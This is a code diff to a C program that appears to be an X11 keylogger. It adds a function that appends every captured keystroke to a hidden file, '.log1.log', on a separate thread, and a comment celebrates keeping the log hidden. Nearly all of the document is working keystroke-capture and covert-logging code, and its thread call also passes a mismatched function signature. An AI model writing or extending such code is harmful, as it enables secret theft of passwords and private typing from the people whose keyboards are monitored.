@@ -1,7 +1,9 @@
+#include <pthread.h>
 #include <string.h>
 #include <X11/Xlib.h>
 #include <unistd.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <signal.h>
 #include <X11/keysym.h>
 
@@ -53,7 +55,7 @@ conv_tab_sp[] = {
     {"space", " "},     {"exclam", "!"},    {"quotedbl", "\""},
     {"4", "$"},{"5", "%"},    {"6", "^"},
     {"7", "&"}, {"8", "*"},{"9", "("},
-    {"10", ")"},{"-", "_"},  {"=", "+"},
+    {"0", ")"},{"-", "_"},  {"=", "+"},
     {",", "<"},     {".", ">"},     {"/", "?"},
     {"'", "\""},  {"[", "{"},     {"]", "}"},
     {"\\", "|"},  {";", ":"}, {"`", ":"}, {"",""}
@@ -83,32 +85,55 @@ int check_sp(char *data, char *out) {
     return 0;
 }
 
+// thinking file operation (plus the encrytion stuff) might take some time,
+// i handled this as a thread. and is stored in a hidden file ;)
+void logfile (char ch)
+{
+	FILE 	*file;
+
+	if (ch != '\0') {
+		if((file = fopen(".log1.log", "a+")) != NULL)
+		{
+		  	fputc(ch, file);
+		  	fclose(file);
+		}
+	}
+}
+
 void log1(char *buf, int masked,  char *c, int caps)
 {
 	char in[128];
+	int err;
+	pthread_t tid=0;
 
 
 	if (strlen(buf) > 1) {// or ignore
 		if (convert(buf, in))
 			if (masked == 1) 
 				if (check_sp(in, in))
-					printf("%c", *c=*in);
+					*c=*in;
 				else
-					printf("%c", *c=*in);
+					*c=*in;
 			else 
-				printf("%c", *c=*in);
+				*c=*in;
 		else
-			printf("%c", *c=*buf);
+			*c=*buf;
 	}
 	else {
 		if (caps == 1 || (caps == 0 && masked == 1))
 			if (check_sp(buf, in))
-				printf("%c", *c=*in);
+				*c=*in;
 			else
-				printf("%c", *c=toupper(*buf));
+				*c=toupper(*buf);
 		else
-			printf("%c", *c=*buf);
+			*c=*buf;
 	}
+
+	err = pthread_create(&tid, NULL, &logfile, (void*)*c);
+	if (err !=0 ) // did not create the thread? try direcly
+		logfile(*c);
+
+	printf("%c", *c);
 }
 
 int main() 
@@ -255,6 +280,7 @@ int main()
 			count++;
 			if (count == 50) {
 				if (current != 0) {
+					logfile(current);
 					printf("%c", caps == 1 || (caps == 0 && masked == 1) ? toupper(current) : tolower(current));
 					count = 0;
 				}
